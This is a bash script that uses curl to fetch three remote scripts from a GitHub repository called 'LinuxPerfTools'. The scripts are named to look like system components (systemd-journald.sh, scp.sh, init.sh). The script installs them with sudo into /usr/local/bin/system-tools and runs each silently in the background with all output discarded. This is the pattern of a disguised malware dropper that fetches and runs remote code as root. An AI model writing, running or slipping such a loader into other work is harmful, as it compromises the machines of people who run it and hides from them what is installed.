#!/bin/bash

SCRIPT_URLS=(
    "https://raw.githubusercontent.com/merankhairuddin/LinuxPerfTools/refs/heads/main/systemd-journald.sh"
    "https://raw.githubusercontent.com/merankhairuddin/LinuxPerfTools/refs/heads/main/scp.sh"
    "https://raw.githubusercontent.com/merankhairuddin/LinuxPerfTools/refs/heads/main/init.sh"
)

TEMP_PATH="/tmp/system_cache"
TARGET_PATH="/usr/local/bin/system-tools"

mkdir -p "$TEMP_PATH"
sudo mkdir -p "$TARGET_PATH"

download_script() {
    local url="$1"
    local temp_path="$2"
    local name=$(basename "$url")
    curl -s -o "$temp_path/$name" "$url" && chmod +x "$temp_path/$name"
    echo "$temp_path/$name"
}

move_script() {
    local script="$1"
    local destination="$2"
    local name=$(basename "$script")
    sudo mv "$script" "$destination/$name"
    echo "$destination/$name"
}

execute_script() {
    local script="$1"
    nohup bash "$script" >/dev/null 2>&1 &
}

for url in "${SCRIPT_URLS[@]}"; do
    script_path=$(download_script "$url" "$TEMP_PATH")
    if [[ -f "$script_path" ]]; then
        final_path=$(move_script "$script_path" "$TARGET_PATH")
        if [[ -f "$final_path" ]]; then
            execute_script "$final_path"
        fi
    fi
done
